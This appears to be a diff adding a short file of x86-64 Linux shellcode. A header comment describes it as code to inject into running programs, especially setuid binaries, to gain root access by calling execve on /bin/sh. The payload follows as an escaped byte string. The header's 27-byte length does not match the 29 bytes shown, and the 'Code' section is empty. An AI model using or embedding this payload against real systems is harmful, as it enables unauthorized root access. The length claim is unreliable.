@@ -1,0 +1,19 @@
+
+/*
+Description : shell code made by Amr AlAsmer ,that can be injected into executed program 
+,strong when injected into setuid binaries to gain root access 
+
+Code job : push "/bin/sh" string into stack and call execve syscall (0x3b)
+
+Length : 27 bytes
+
+Syntax : intel
+
+Adapted from : Jean Pascal Pereira
+*/
+
+Code :
+
+
+Shell Code in String format :
+"\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x00\x51\x48\xc7\xc0\x3b\x00\x00\x00\x48\x89\xe7\x48\x31\xd2\x48\x31\xf6\x0f\x05"
